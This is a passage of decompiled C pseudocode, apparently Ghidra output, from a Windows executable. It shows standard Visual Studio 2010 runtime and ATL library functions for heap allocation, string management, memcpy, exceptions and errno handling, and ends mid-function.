/* Function: ~CWin32Heap */

/* Library Function - Single Match
    public: virtual __thiscall ATL::CWin32Heap::~CWin32Heap(void)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __thiscall ATL::CWin32Heap::~CWin32Heap(CWin32Heap *this)

{
  *(undefined ***)this = &PTR_FUN_00415270;
  if ((this[8] != (CWin32Heap)0x0) && (*(HANDLE *)(this + 4) != (HANDLE)0x0)) {
    HeapDestroy(*(HANDLE *)(this + 4));
  }
  return;
}



/* Function: FUN_004067cf */

void __thiscall FUN_004067cf(void *this,SIZE_T param_1)

{
  HeapAlloc(*(HANDLE *)((int)this + 4),0,param_1);
  return;
}



/* Function: FUN_004067e6 */

void __thiscall FUN_004067e6(void *this,LPVOID param_1)

{
  if (param_1 != (LPVOID)0x0) {
    HeapFree(*(HANDLE *)((int)this + 4),0,param_1);
  }
  return;
}



/* Function: Reallocate */

/* Library Function - Single Match
    public: virtual void * __thiscall ATL::CWin32Heap::Reallocate(void *,unsigned int)
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

void * __thiscall ATL::CWin32Heap::Reallocate(CWin32Heap *this,void *param_1,uint param_2)

{
  void *pvVar1;
  
  if (param_1 == (void *)0x0) {
    pvVar1 = (void *)(*(code *)**(undefined4 **)this)(param_2);
  }
  else if (param_2 == 0) {
    (**(code **)(*(int *)this + 4))(param_1);
    pvVar1 = (void *)0x0;
  }
  else {
    pvVar1 = HeapReAlloc(*(HANDLE *)(this + 4),0,param_1,param_2);
  }
  return pvVar1;
}



/* Function: FUN_0040683d */

void __thiscall FUN_0040683d(void *this,LPCVOID param_1)

{
  HeapSize(*(HANDLE *)((int)this + 4),0,param_1);
  return;
}



/* Function: `scalar_deleting_destructor' */

/* Library Function - Single Match
    public: virtual void * __thiscall ATL::CWin32Heap::`scalar deleting destructor'(unsigned int)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void * __thiscall ATL::CWin32Heap::_scalar_deleting_destructor_(CWin32Heap *this,uint param_1)

{
  ~CWin32Heap(this);
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return this;
}



/* Function: AtlMultiply<unsigned_long> */

/* Library Function - Single Match
    long __cdecl ATL::AtlMultiply<unsigned long>(unsigned long *,unsigned long,unsigned long)
   
   Library: Visual Studio 2010 Release */

long __cdecl ATL::AtlMultiply<unsigned_long>(ulong *param_1,ulong param_2,ulong param_3)

{
  if ((int)((ulonglong)param_2 * (ulonglong)param_3 >> 0x20) != 0) {
    return -0x7ff8fdea;
  }
  *param_1 = (ulong)((ulonglong)param_2 * (ulonglong)param_3);
  return 0;
}



/* Function: FUN_00406899 */

void __fastcall FUN_00406899(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x004068a4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (**(code **)(**(int **)(param_1 + 4) + 4))();
  return;
}



/* Function: FUN_004068a7 */

undefined8 __fastcall FUN_004068a7(int param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(param_1 + 0x14);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + 1;
  UNLOCK();
  return CONCAT44(iVar2,param_1 + 8);
}



/* Function: FUN_004068b8 */

undefined4 * __thiscall FUN_004068b8(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_Allocate_00415284;
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return (undefined4 *)this;
}



/* Function: AtlAdd<unsigned_int> */

/* Library Function - Single Match
    long __cdecl ATL::AtlAdd<unsigned int>(unsigned int *,unsigned int,unsigned int)
   
   Library: Visual Studio 2010 Release */

long __cdecl ATL::AtlAdd<unsigned_int>(uint *param_1,uint param_2,uint param_3)

{
  if (-param_2 - 1 < param_3) {
    return -0x7ff8fdea;
  }
  *param_1 = param_2 + param_3;
  return 0;
}



/* Function: Allocate */

/* Library Function - Single Match
    public: virtual struct ATL::CStringData * __thiscall ATL::CAtlStringMgr::Allocate(int,int)
   
   Library: Visual Studio 2010 Release */

CStringData * __thiscall ATL::CAtlStringMgr::Allocate(CAtlStringMgr *this,int param_1,int param_2)

{
  long lVar1;
  CStringData *pCVar2;
  uint uVar3;
  
  uVar3 = param_1 + 8U & 0xfffffff8;
  lVar1 = AtlMultiply<unsigned_long>((ulong *)&param_1,uVar3,param_2);
  if (((-1 < lVar1) && (lVar1 = AtlAdd<unsigned_int>((uint *)&param_1,0x10,param_1), -1 < lVar1)) &&
     (pCVar2 = (CStringData *)(**(code **)**(undefined4 **)(this + 4))(param_1),
     pCVar2 != (CStringData *)0x0)) {
    *(undefined4 *)(pCVar2 + 4) = 0;
    *(CAtlStringMgr **)pCVar2 = this;
    *(undefined4 *)(pCVar2 + 0xc) = 1;
    *(uint *)(pCVar2 + 8) = uVar3 - 1;
    return pCVar2;
  }
  return (CStringData *)0x0;
}



/* Function: Reallocate */

/* Library Function - Single Match
    public: virtual struct ATL::CStringData * __thiscall ATL::CAtlStringMgr::Reallocate(struct
   ATL::CStringData *,int,int)
   
   Library: Visual Studio 2010 Release */

CStringData * __thiscall
ATL::CAtlStringMgr::Reallocate(CAtlStringMgr *this,CStringData *param_1,int param_2,int param_3)

{
  long lVar1;
  CStringData *pCVar2;
  uint uVar3;
  
  uVar3 = param_2 + 8U & 0xfffffff8;
  lVar1 = AtlMultiply<unsigned_long>((ulong *)&param_2,uVar3,param_3);
  if (((-1 < lVar1) && (lVar1 = AtlAdd<unsigned_int>((uint *)&param_2,0x10,param_2), -1 < lVar1)) &&
     (pCVar2 = (CStringData *)(**(code **)(**(int **)(this + 4) + 8))(param_1,param_2),
     pCVar2 != (CStringData *)0x0)) {
    *(uint *)(pCVar2 + 8) = uVar3 - 1;
    return pCVar2;
  }
  return (CStringData *)0x0;
}



/* Function: FUN_004069bf */

void FUN_004069bf(uint param_1)

{
  operator_new(param_1);
  return;
}



/* Function: FUN_004069ca */

void FUN_004069ca(void *param_1)

{
  _free(param_1);
  return;
}



/* Function: __security_check_cookie */

/* Library Function - Single Match
    @__security_check_cookie@4
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release
   __fastcall __security_check_cookie,4 */

void __fastcall __security_check_cookie(int param_1)

{
  if (param_1 == DAT_004191b4) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  ___report_gsfailure();
}



/* Function: FID_conflict:_memcpy */

/* Library Function - Multiple Matches With Different Base Names
    _memcpy
    _memmove
   
   Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release */

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_00406bcf_caseD_2;
        case 3:
          goto switchD_00406bcf_caseD_3;
        }
        goto switchD_00406bcf_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_00406bcf_caseD_0;
      case 1:
        goto switchD_00406bcf_caseD_1;
      case 2:
        goto switchD_00406bcf_caseD_2;
      case 3:
        goto switchD_00406bcf_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00406bcf_caseD_2;
            case 3:
              goto switchD_00406bcf_caseD_3;
            }
            goto switchD_00406bcf_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00406bcf_caseD_2;
            case 3:
              goto switchD_00406bcf_caseD_3;
            }
            goto switchD_00406bcf_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00406bcf_caseD_2;
            case 3:
              goto switchD_00406bcf_caseD_3;
            }
            goto switchD_00406bcf_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00406bcf_caseD_1:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_00406bcf_caseD_2:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_00406bcf_caseD_3:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
      *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_00406bcf_caseD_0:
    return _Dst;
  }
  if (((0x7f < _Size) && (DAT_0041ebdc != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = FUN_00407a5f(_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_00406a49_caseD_2;
      case 3:
        goto switchD_00406a49_caseD_3;
      }
      goto switchD_00406a49_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_00406a49_caseD_0;
    case 1:
      goto switchD_00406a49_caseD_1;
    case 2:
      goto switchD_00406a49_caseD_2;
    case 3:
      goto switchD_00406a49_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    /* WARNING: Load size is inaccurate */
        *(undefined1 *)_Dst = *_Src;
        *(undefined1 *)((int)_Dst + 1) = *(undefined1 *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined1 *)((int)_Dst + 2) = *(undefined1 *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00406a49_caseD_2;
          case 3:
            goto switchD_00406a49_caseD_3;
          }
          goto switchD_00406a49_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    /* WARNING: Load size is inaccurate */
        *(undefined1 *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined1 *)((int)_Dst + 1) = *(undefined1 *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00406a49_caseD_2;
          case 3:
            goto switchD_00406a49_caseD_3;
          }
          goto switchD_00406a49_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    /* WARNING: Load size is inaccurate */
        *(undefined1 *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00406a49_caseD_2;
          case 3:
            goto switchD_00406a49_caseD_3;
          }
          goto switchD_00406a49_caseD_1;
        }
      }
    }
  }
  switch(uVar2) {
  case 7:
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 6:
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 5:
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 4:
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 3:
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 2:
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 1:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_00406a49_caseD_1:
                    /* WARNING: Load size is inaccurate */
    *(undefined1 *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_00406a49_caseD_2:
                    /* WARNING: Load size is inaccurate */
    *(undefined1 *)puVar1 = *_Src;
    *(undefined1 *)((int)puVar1 + 1) = *(undefined1 *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_00406a49_caseD_3:
                    /* WARNING: Load size is inaccurate */
    *(undefined1 *)puVar1 = *_Src;
    *(undefined1 *)((int)puVar1 + 1) = *(undefined1 *)((int)_Src + 1);
    *(undefined1 *)((int)puVar1 + 2) = *(undefined1 *)((int)_Src + 2);
    return _Dst;
  }
switchD_00406a49_caseD_0:
  return _Dst;
}



/* Function: FUN_00406d60 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

float10 __cdecl FUN_00406d60(double param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  ushort in_FPUControlWord;
  float10 fVar4;
  double dVar5;
  longlong lVar6;
  
  if ((DAT_0041ebd4 != 0) && ((MXCSR & 0x7f80) == 0x1f80 && (in_FPUControlWord & 0x7f) == 0x7f)) {
    uVar2 = (uint)((ulonglong)param_1 >> 0x20);
    uVar1 = uVar2 >> 0x14;
    lVar6 = CONCAT44(_UNK_004152b4,_DAT_004152b0 - (uVar2 >> 0x14 & _DAT_004152d0));
    if ((uVar1 & 0x800) == 0) {
      dVar5 = (double)(((ulonglong)param_1 >> lVar6) << lVar6);
      if (uVar1 < 0x3ff) {
        return (float10)(double)(-(ulonglong)(_DAT_004152c0 < param_1) & _DAT_004152a0);
      }
      if (uVar1 < 0x433) {
        return (float10)(dVar5 + (double)(-(ulonglong)(dVar5 < param_1) & _DAT_004152a0));
      }
    }
    else {
      if (uVar1 < 0xbff) {
        return (float10)_DAT_004152e0;
      }
      if (uVar1 < 0xc33) {
        return (float10)(double)(((ulonglong)param_1 >> lVar6) << lVar6);
      }
    }
    if (NAN(param_1)) {
      ___libm_error_support(&param_1,&param_1,&param_1,0x3ec);
    }
    return (float10)param_1;
  }
  uVar2 = __ctrlfp();
  if ((param_1._6_2_ & 0x7ff0) == 0x7ff0) {
    iVar3 = __sptype(SUB84(param_1,0),(uint)((ulonglong)param_1 >> 0x20));
    if (0 < iVar3) {
      if (iVar3 < 3) {
        __ctrlfp();
        return (float10)param_1;
      }
      if (iVar3 == 3) {
        fVar4 = __handle_qnan1(0xc,param_1);
        return fVar4;
      }
    }
    dVar5 = param_1 + _DAT_004153f8;
    uVar1 = 8;
  }
  else {
    fVar4 = __frnd(param_1);
    dVar5 = (double)fVar4;
    if ((param_1 == dVar5) || ((uVar2 & 0x20) != 0)) {
      __ctrlfp();
      return (float10)dVar5;
    }
    uVar1 = 0x10;
  }
  fVar4 = (float10)__except1(uVar1,0xc,param_1,dVar5,uVar2);
  return fVar4;
}



/* Function: ~type_info */

/* Library Function - Single Match
    public: virtual __thiscall type_info::~type_info(void)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = vftable;
  _Type_info_dtor(this);
  return;
}



/* Function: `scalar_deleting_destructor' */

/* Library Function - Single Match
    public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release */

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return this;
}



/* Function: operator== */

/* Library Function - Single Match
    public: bool __thiscall type_info::operator==(class type_info const &)const 
   
   Library: Visual Studio 2010 Release */

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



/* Function: exception */

/* Library Function - Single Match
    public: __thiscall std::exception::exception(char const * const &,int)
   
   Library: Visual Studio 2010 Release */

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  *(undefined ***)this = vftable;
  *(char **)(this + 4) = *param_1;
  this[8] = (exception)0x0;
  return;
}



/* Function: FUN_00406eeb */

char * __fastcall FUN_00406eeb(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}



/* Function: _Copy_str */

/* Library Function - Single Match
    private: void __thiscall std::exception::_Copy_str(char const *)
   
   Library: Visual Studio 2010 Release */

void __thiscall std::exception::_Copy_str(exception *this,char *param_1)

{
  size_t sVar1;
  char *_Dst;
  
  if (param_1 != (char *)0x0) {
    sVar1 = _strlen(param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,param_1);
      this[8] = (exception)0x1;
    }
  }
  return;
}



/* Function: _Tidy */

/* Library Function - Single Match
    private: void __thiscall std::exception::_Tidy(void)
   
   Library: Visual Studio 2010 Release */

void __thiscall std::exception::_Tidy(exception *this)

{
  if (this[8] != (exception)0x0) {
    _free(*(void **)(this + 4));
  }
  *(undefined4 *)(this + 4) = 0;
  this[8] = (exception)0x0;
  return;
}



/* Function: exception */

/* Library Function - Single Match
    public: __thiscall std::exception::exception(char const * const &)
   
   Library: Visual Studio 2010 Release */

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = vftable;
  this[8] = (exception)0x0;
  _Copy_str(this,*param_1);
  return this;
}



/* Function: operator= */

/* Library Function - Single Match
    public: class std::exception & __thiscall std::exception::operator=(class std::exception const
   &)
   
   Library: Visual Studio 2010 Release */

exception * __thiscall std::exception::operator=(exception *this,exception *param_1)

{
  if (this != param_1) {
    _Tidy(this);
    if (param_1[8] == (exception)0x0) {
      *(undefined4 *)(this + 4) = *(undefined4 *)(param_1 + 4);
    }
    else {
      _Copy_str(this,*(char **)(param_1 + 4));
    }
  }
  return this;
}



/* Function: FUN_00406fb2 */

void __fastcall FUN_00406fb2(exception *param_1)

{
  *(undefined ***)param_1 = std::exception::vftable;
  std::exception::_Tidy(param_1);
  return;
}



/* Function: FUN_00406fbd */

exception * __thiscall FUN_00406fbd(void *this,byte param_1)

{
  *(undefined ***)this = std::exception::vftable;
  std::exception::_Tidy((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return (exception *)this;
}



/* Function: exception */

/* Library Function - Single Match
    public: __thiscall std::exception::exception(class std::exception const &)
   
   Library: Visual Studio 2010 Release */

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = vftable;
  this[8] = (exception)0x0;
  operator=(this,param_1);
  return this;
}



/* Function: _free */

/* Library Function - Single Match
    _free
   
   Library: Visual Studio 2010 Release */

void __cdecl _free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_0041aeb8,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



/* Function: _malloc */

/* Library Function - Single Match
    _malloc
   
   Library: Visual Studio 2010 Release */

void * __cdecl _malloc(size_t _Size)

{
  SIZE_T dwBytes;
  LPVOID pvVar1;
  int iVar2;
  int *piVar3;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_0041aeb8 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      dwBytes = _Size;
      if (_Size == 0) {
        dwBytes = 1;
      }
      pvVar1 = HeapAlloc(DAT_0041aeb8,0,dwBytes);
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (DAT_0041b51c == 0) {
        piVar3 = __errno();
        *piVar3 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  return (void *)0x0;
}



/* Function: operator_new */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    void * __cdecl operator new(unsigned int)
   
   Library: Visual Studio 2010 Release */

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined **local_14 [3];
  char *local_8;
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_0041ab78 & 1) == 0) {
    _DAT_0041ab78 = _DAT_0041ab78 | 1;
    local_8 = "bad allocation";
    std::exception::exception((exception *)&DAT_0041ab6c,&local_8,1);
    _DAT_0041ab6c = std::bad_alloc::vftable;
    _atexit((_func_4879 *)&LAB_00414325);
  }
  std::exception::exception((exception *)local_14,(exception *)&DAT_0041ab6c);
  local_14[0] = std::bad_alloc::vftable;
  __CxxThrowException_8(local_14,&DAT_00417ecc);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



/* Function: _abort */

/* Library Function - Single Match
    _abort
   
   Library: Visual Studio 2010 Release */

void __cdecl _abort(void)

{
  code *pcVar1;
  int iVar2;
  
  iVar2 = FUN_00408858();
  if (iVar2 != 0) {
    _raise(0x16);
  }
  if ((DAT_00419038 & 2) != 0) {
    __call_reportfault(3,0x40000015,1);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: __vsprintf_l */

/* Library Function - Single Match
    __vsprintf_l
   
   Library: Visual Studio 2010 Release */

int __cdecl __vsprintf_l(char *_DstBuf,char *_Format,_locale_t param_3,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  char **ppcVar3;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar3 = (char **)&local_24._cnt;
  for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {
    *ppcVar3 = (char *)0x0;
    ppcVar3 = ppcVar3 + 1;
  }
  if ((_Format != (char *)0x0) && (_DstBuf != (char *)0x0)) {
    local_24._base = _DstBuf;
    local_24._ptr = _DstBuf;
    local_24._cnt = 0x7fffffff;
    local_24._flag = 0x42;
    iVar2 = __output_l(&local_24,_Format,param_3,_ArgList);
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      __flsbuf(0,&local_24);
    }
    else {
      *local_24._ptr = '\0';
    }
    return iVar2;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  FUN_004087f3();
  return -1;
}



/* Function: _vsprintf */

/* Library Function - Single Match
    _vsprintf
   
   Library: Visual Studio 2010 Release */

int __cdecl _vsprintf(char *_Dest,char *_Format,va_list _Args)

{
  int iVar1;
  
  iVar1 = __vsprintf_l(_Dest,_Format,(_locale_t)0x0,_Args);
  return iVar1;
}



/* Function: _wcscpy_s */

/* Library Function - Single Match
    _wcscpy_s
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack_10;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    if (_Src != (wchar_t *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        wVar1 = *_Src;
        *(wchar_t *)(iVar3 + (int)_Src) = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eStack_10 = 0x22;
      *piVar2 = 0x22;
      goto LAB_00407247;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_00407247:
  FUN_004087f3();
  return eStack_10;
}



/* Function: __get_errno_from_oserr */

/* Library Function - Single Match
    __get_errno_from_oserr
   
   Library: Visual Studio 2010 Release */

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00419040)[uVar1 * 2]) {
      return *(int *)(uVar1 * 8 + 0x419044);
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



/* Function: __errno */

/* Library Function - Single Match
    __errno
   
   Library: Visual Studio 2010 Release */

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_004191a8;
  }
  return &p_Var1->_terrno;
}



/* Function: ___doserrno */

/* Library Function - Single Match
    ___doserrno
   
   Library: Visual Studio 2010 Release */

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_004191ac;
  }
  return &p_Var1->_tdoserrno;
}



/* Function: __dosmaperr */

/* Library Function - Single Match
    __dosmaperr
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
